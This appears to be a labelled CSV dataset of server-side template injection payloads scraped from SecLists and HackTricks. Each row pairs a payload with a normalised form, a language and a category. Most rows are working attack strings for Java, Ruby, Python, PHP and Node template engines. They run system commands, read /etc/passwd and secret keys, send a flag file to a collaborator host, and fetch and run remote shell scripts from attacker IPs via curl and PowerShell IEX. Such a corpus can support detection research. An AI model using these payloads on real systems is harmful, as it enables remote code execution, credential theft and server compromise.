P#{XXXXX}ug,p#{xxxxx}ug,ruby,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Thym[[${session}]]eleaf,thym[[${session}]]eleaf,java,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Dus{XXXXXXX}tjs,dus{xxxxxxx}tjs,unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"La{var $X=""tt""}{$X}e","la{var$x=""S""}{$x}e",unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Underscore OR<%""XXXXXXXXXX""%>Ejs","underscoreor<%""S""%>ejs",ruby,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"E<%=""j""_%>s","e<%=""S""_%>s",ruby,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"This{{printf ""is ""}}GO","this{{printf""S""}}go",unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Haml#{""OR""}Slim","haml#{""S""}slim",ruby,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Erb<%=""OR Erubi OR""%>Erubis","erb<%=""S""%>erubis",ruby,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Must{{Context.lookup}}ache,must{{context.lookup}}ache,unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Handlebars OR Hogan{{XXXXXXX}} OR Pystache,handlebarsorhogan{{xxxxxxx}}orpystache,unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{#if 0 IncludeZero=true}}Handlebars{{/if}},{{#ifNincludezero=true}}handlebars{{/if}},unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Mako${""OR Chameleon OR ""}Cheetah","mako${""S""}cheetah",java,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Freemakers${"" OR ""}Groovy","freemakers${""S""}groovy",java,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Liquid AND Blade OR Twig {{"" AND Jinja2 OR Bottle OR Tornado OR Django AND ""}}Nunjucks OR Twig OR Vue","liquidandbladeortwig{{""S""}}nunjucksortwigorvue",unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{|reverse}},{{|reverse}},unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{|wordcount}},{{|wordcount}},unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{-Comment-}},{{-comment-}},unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"{{ ""<h1>Django OR Jinja</h1>""|striptags }}","{{""S""|striptags}}",unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Djan{{ Jinja2.Django }}go,djan{{jinjaN.django}}go,unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Torn{% comment %}ado,torn{%comment%}ado,unknown,unknown,1,uncertain,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
http://vulnerable-website.com/?name={{bad-stuff-here}},http://vulnerable-website.com/?name={{bad-stuff-here}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"~s|#{name}=""#{val}""|","~s|#{name}=""S""|",ruby,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${class.getResource("""").getPath()}","${class.getresource(""S"").getpath()}",java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.","//if${...}doesn'tworktry#{...},*{...},@{...}or~{...}.",java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${T(java.lang.System).getenv()},${t(java.lang.system).getenv()},java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}","<#assignex=""S""?new()>${ex(""S"")}",java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},[#assignex='S'?new()]${ex('S')},java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${""freemarker.template.utility.Execute""?new()(""id"")}","${""S""?new()(""S"")}",java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join("" "")}","${product.getclass().getprotectiondomain().getcodesource().getlocation().touri().resolve('S').tourl().openstream().readallbytes()?join(""S"")}",java,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(""calc"")}","${#rt=@java.lang.runtime@getruntime(),#rt.exec(""S"")}",java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
#{selection.__${sel.code}__},#{selection.__${sel.code}__},java,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<a th:href=""@{__${path}__}"" th:title=""${title}"">","<ath:href=""S""th:title=""S"">",java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<a th:href=""${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}"" th:title='pepito'>","<ath:href=""S""th:title='S'>",java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')}),http://localhost:N/(${t(java.lang.runtime).getruntime().exec('S')}),java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},*{t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},unknown,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(""id"").getInputStream()).next()}__::.x","__${newjava.util.scanner(t(java.lang.runtime).getruntime().exec(""S"").getinputstream()).next()}__::.x",java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"__${T(java.lang.Runtime).getRuntime().exec(""touch executed"")}__::.x","__${t(java.lang.runtime).getruntime().exec(""S"")}__::.x",java,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }},{{variable.getclass().forname('S').getruntime().exec('S')}},python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% raw %},{%raw%},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% endraw %},{%endraw%},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{request.isDebug()}},{{request.isdebug()}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}},{{'S'.getclass().forname('S').newinstance()}},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}},{{'S'.getclass().forname('S').newinstance()}},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% %} and {{ }} blocks,{%%}and{{}}blocks,python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %},{%setji='S'.getclass().forname('S').newinstance().newinterpreter()%},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ji.render('{{1*2}}')}},{{ji.render('S')}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}","//{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S"")}}",python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{_self}} #(Ref. to current application),{{_self}}#(ref.tocurrentapplication),python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{dump(app)}},{{dump(app)}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{app.request.server.all|join(',')}}",{{app.request.server.all|join('S')}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{_self.env.registerUndefinedFilterCallback(""system"")}}{{_self.env.getFilter(""whoami"")}}","{{_self.env.registerundefinedfiltercallback(""S"")}}{{_self.env.getfilter(""S"")}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{_self.env.registerUndefinedFilterCallback(""system"")}}{{_self.env.getFilter(""id;uname -a;hostname"")}}","{{_self.env.registerundefinedfiltercallback(""S"")}}{{_self.env.getfilter(""S"")}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{['id']|filter('system')}},{{['S']|filter('S')}},python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{['cat\x20/etc/passwd']|filter('system')}},{{['S']|filter('S')}},python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{['cat$IFS/etc/passwd']|filter('system')}},{{['S']|filter('S')}},python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{['id',""""]|sort('system')}}","{{['S',""S""]|sort('S')}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{[""error_reporting"", ""0""]|sort(""ini_set"")}}","{{[""S"",""S""]|sort(""S"")}}",python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{this.push ""return require('child_process').exec('whoami');""}}","{{this.push""S""}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}","{{:%Ntest%N.tostring.constructor.call({},%Nalert(%Nxss%N)%N)()}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{:""pwnd"".toString.constructor.call({},""return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()"")()}}","{{:""S"".tostring.constructor.call({},""S"")()}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<%= system(""whoami"") %> #Execute code","<%=system(""S"")%>#executecode",ruby,ERB,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= Dir.entries('/') %> #List folder,<%=dir.entries('S')%>#listfolder,ruby,ERB,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= File.open('/etc/passwd').read %> #Read file,<%=file.open('S').read%>#readfile,ruby,ERB,1,enumeration,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= IO.popen('ls /').readlines() %>,<%=io.popen('S').readlines()%>,ruby,ERB,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% import foobar %} = Error,{%importfoobar%}=error,python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% import os %},{%importos%},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% debug %},{%debug%},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{settings.SECRET_KEY}},{{settings.secret_key}},python,unknown,1,enumeration,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${x},${x},java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<%= CreateObject(""Wscript.Shell"").exec(""powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')"").StdOut.ReadAll() %>","<%=createobject(""S"").exec(""S"").stdout.readall()%>",ruby,ERB,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= perl code %>,<%=perlcode%>,ruby,ERB,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<% perl code %>,<%perlcode%>,ruby,ERB,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{bad-stuff-here}},{{bad-stuff-here}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
#{7*7} = 49 -- (legacy),#{N*N}=N--(legacy),ruby,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${7*'7'} Nothing,${N*'S'}nothing,java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${foobar},${foobar},java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ request }},{{request}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.toUpperCase()}},{{'S'.touppercase()}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.concat('b')}},{{'S'.concat('S')}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.getClass()}},{{'S'.getclass()}},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{request.getClass()}},{{request.getclass()}},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{request.getClass().getDeclaredMethods()[0]}},{{request.getclass().getdeclaredmethods()[N]}},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${""aaaa""}","${""S""}",java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${{request}}, ${{session}}, {{faceContext}}","${{request}},${{session}},{{facecontext}}",java,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{groovy}},{{groovy}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{groovy}}println(""id"".execute().text){{/groovy}}","{{groovy}}println(""S"".execute().text){{/groovy}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{1/0}} = Error,{{N/N}}=error,python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{foobar}} Nothing,{{foobar}}nothing,python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(""child_process"").exec('touch /tmp/pwned.txt')}()}","#{function(){localload=global.process.mainmodule.constructor._load;sh=localload(""S"").exec('S')}()}",ruby,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(""child_process"").exec('curl 10.10.14.3:8001/s.sh | bash')}()}","#{function(){localload=global.process.mainmodule.constructor._load;sh=localload(""S"").exec('S')}()}",ruby,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= foobar %> = Error,<%=foobar%>=error,ruby,ERB,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{foobar}} = Error,{{foobar}}=error,python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{7*7}} = Error,{{N*N}}=error,python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{config}},{{config}},python,unknown,1,enumeration,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{config.items()}},{{config.items()}},python,unknown,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{settings}},{{settings}},python,unknown,1,enumeration,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"@(""{{code}}"") <= Success","@(""S"")<=success",python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
@{} <= ERROR!,@{}<=error!,unknown,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= foo %>,<%=foo%>,ruby,ERB,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
<%= response.write(date()) %>,<%=response.write(date())%>,ruby,ERB,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ .Password }},{{.password}},python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{printf ""%s"" ""ssti"" }}","{{printf""S""""S""}}",python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{html ""ssti""}}","{{html""S""}}",python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{js ""ssti""}}","{{js""S""}}",python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{""<script>alert(1)</script>""}}","{{""S""}}",python,unknown,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"{{ .System ""ls"" }}","{{.system""S""}}",python,unknown,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"#{""""[""class""]}","#{""S""[""S""]}",java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
